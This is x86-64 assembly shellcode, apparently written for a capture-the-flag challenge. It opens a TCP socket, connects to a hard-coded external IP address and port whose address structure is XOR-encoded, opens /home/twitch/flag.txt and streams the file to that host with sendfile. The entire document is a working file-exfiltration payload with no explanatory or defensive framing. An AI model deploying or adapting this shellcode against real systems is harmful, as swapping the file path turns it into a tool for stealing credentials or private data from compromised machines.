  BITS 64
	global _start
	section .text
%define SYS_socket 0x29
%define AddressFamily.AF_INET 2
%define SOCK_STREAM 1

%define SYS_connect 0x2a
%define SYS_sendfile 0x28 
%define SYS_open 2
_start:
    ;open new socket
    ;/* open new socket */
    ;/* call socket(<AddressFamily.AF_INET: 2>, Constant('SOCK_STREAM', 0x1), 0) */
    push SYS_socket ;/* 0x29 */
    pop rax
    push AddressFamily.AF_INET
    pop rdi
    push SOCK_STREAM ;/* 1 */
    pop rsi
    cdq ;/* rdx=0 */
    syscall

    ;/* Put socket into rbp */
    mov rbp, rax

	;IP: 35.238.202.10 PORT: 6969
    ;/* Create address structure on stack */
    ;/* push b'\x02\x00\x1b9#\xee\xca\n' */
    mov rax, 0x201010101010101
    push rax
    mov rax, 0x201010101010101 ^ 0xacaee23391b0002
    xor [rsp], rax

    ;/* Connect the socket */
    ;/* call connect('rbp', 'rsp', 16) */
    push SYS_connect 
    pop rax
    mov rdi, rbp
    push 0x10
    pop rdx
    mov rsi, rsp
    syscall

    ;/* push b'/home/twitch/flag.txt\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x7478742e67
    xor [rsp], rax
    mov rax, 0x616c662f68637469
    push rax
    mov rax, 0x77742f656d6f682f
    push rax
    ;/* call open('rsp', 'O_RDONLY', 0) */
    push SYS_open ;/* 2 */
    pop rax
    mov rdi, rsp
    xor esi, esi ;/* O_RDONLY */
    cdq ;/* rdx=0 */
    syscall
    ;/* call sendfile(rbp, 'rax', 0, 2147483647) */
    mov r10d, 0x7fffffff
    mov rsi, rax
    push SYS_sendfile ;/* 0x28 */
    pop rax
    push rbp
    pop rdi
    cdq ;/* rdx=0 */
    syscall

